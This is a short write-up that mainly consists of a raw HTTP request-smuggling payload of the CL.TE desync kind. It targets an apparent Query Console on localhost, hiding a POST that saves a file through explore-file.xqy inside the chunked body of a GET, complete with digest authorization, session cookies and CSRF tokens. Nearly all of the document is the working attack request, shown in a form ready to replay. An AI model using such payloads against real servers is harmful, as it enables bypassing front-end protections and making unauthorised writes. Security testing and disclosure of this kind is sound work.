Here is the request formatted in Markdown. This clearly shows the **CL.TE** (Content-Length / Transfer-Encoding) desync structure, where the second `POST` request is being "smuggled" inside the body of the first `GET` request.

HTTP

```
GET /qconsole/ HTTP/1.1 
Host: localhost:8000 
Authorization: Digest username="user", realm="public", nonce="3f2b70beca9452:uaBlOjDObd80mwaiQozjZg==", uri="/qconsole/", response="9966a639de01c1757f46ddf9ce8719e2", opaque="3de8b3f52e390f66", qop=auth, nc=0000004d, cnonce="1298d6f7fe379e8e" 
Connection: keep-alive 
Cookie: server-port=8000; username=user; csrf-token-8000-admin=a729619d2b944e9be9ab45f229097cf6a16c5f9ab4f92d758e0320707de355ac; csrf-token-8000-user=595bbed14c4ffa401775ffe616231f0061c8c9d4907c8ddc87372de5cd96e90a; SessionID=6f224d0488a16362 
Content-Length: 5 
Transfer-Encoding: chunked 

582 
POST /qconsole/endpoints/explore-file.xqy?dbid=17651114621713401149&uri=test&view-action=save&cache=1778069282546 HTTP/1.1 
Host: localhost:8000 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0 
Accept: application/json, text/plain, */* 
Accept-Language: en-US,en;q=0.9 
Accept-Encoding: gzip, deflate, br 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhkAdE4oPlz4atDyC 
X-CSRF-Token: 8c757634a1a7f8cf8d125bc5dba41cbe7ca3a3816320f8c0339eebfee5742bb9 
Content-Length: 1530 
Origin: http://localhost:8000 
Authorization: Digest username="user", realm="public", nonce="3f2b70beca9452:uaBlOjDObd80mwaiQozjZg==", uri="/qconsole/endpoints/explore-file.xqy?dbid=17651114621713401149&uri=test&view-action=save&cache=1778069282546", response="f4c1c1bec439a771507120f56cd28f1a", opaque="3de8b3f52e390f66", qop=auth, nc=0000008d, cnonce="90e2cd0a4e0136dc" 
Connection: keep-alive 
Referer: http://localhost:8000/qconsole/ 
Cookie: server-port=8000; username=user; csrf-token-8000-admin=a729619d2b944e9be9ab45f229097cf6a16c5f9ab4f92d758e0320707de355ac; csrf-token-8000-user=8c757634a1a7f8cf8d125bc5dba41cbe7ca3a3816320f8c0339eebfee5742bb9; SessionID=6f224d0488a16362 
Sec-Fetch-Dest: empty 
Sec-Fetch-Mode: cors 
Sec-Fetch-Site: same-origin 
X-PwnFox-Color: blue 

------WebKitFormBoundaryhkAdE4oPlz4atDyC 
Content-Disposition: form-data; name="data" 

test 
0
```